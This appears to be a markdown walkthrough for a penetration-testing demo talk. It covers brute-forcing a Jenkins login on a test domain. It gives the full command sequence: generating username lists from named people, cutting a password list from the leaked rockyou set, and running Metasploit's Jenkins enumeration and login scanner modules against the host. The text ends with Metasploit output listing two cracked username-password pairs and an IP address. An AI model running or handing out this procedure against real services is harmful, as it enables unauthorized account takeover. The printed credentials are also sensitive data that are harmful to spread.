# Bruteforce Jenkins Login
This section aims to login to the company's Jenkins instance.
To do so, we'll prepare a list of usernames and check login with rockyou list.
Before login can be bruteforced, the login URL must be identified via BurpSuite.

## Open Questions
- how do I know the port
- how do I know the URL

## Prepare Usernamelist

```bash
mkdir -p /root/demotalk/jenkinsBrute/
cd /root/demotalk
git clone https://github.com/captain-noob/username-list-generator.git
cd username-list-generator
rm output.txt user.txt
nano user.txt
```

put the names into nano.
Dont take all names to not break too much bruteforce into
```
Kay Meyer
Robert Bartsch
Ricardo Pope
Jeffrey van der Linden
```

```bash
python3 userlistcreator.py
mv output.txt /root/demotalk/jenkinsBrute/userlist.txt
cd /root/demotalk/jenkinsBrute/
```

## Prepare Passwordlist
Let's use the end of rockyoulist as that contains the sophisticated passwords
It contains 14344392 leaked passwords
Rockyou.txt is a set of compromised passwords from the social media application developer also known as RockYou. It developed widgets for the Myspace application. In December 2009, the company experienced a data breach resulting in the exposure of more than 32 million user accounts. It was mainly because of the company’s policy of storing the passwords in cleartext.

```bash
cd /root/demotalk/jenkinsBrute/
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
```
## Enum Module
Let's get some details of Jenkins

```bash
msfconsole
use auxiliary/scanner/http/jenkins_enum
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 8080
set TARGETURI /
exploit
```

## Login Scan Module


#### Get Login URL
use Burpsuite

### Prepare Options
prepare the exploit

```bash
msfconsole
use auxiliary/scanner/http/jenkins_login
set RHOSTS jenkins.test.nevervictimconsult.xyz
set RPORT 8080
set USER_FILE /root/demotalk/jenkinsBrute/userlist.txt
set PASS_FILE /root/demotalk/jenkinsBrute/passwordlist.txt
set LOGIN_URL j_spring_security_check
```
There will be two successful attempts

```bash
[+] 34.159.77.191:8080 - Login Successful: Robert.Bartsch:!@#$%1234pacr1234!@#$%
[+] 34.159.77.191:8080 - Login Successful: Jeffrey_van_d_Linden:!@#$%67890QAZwsxh
```
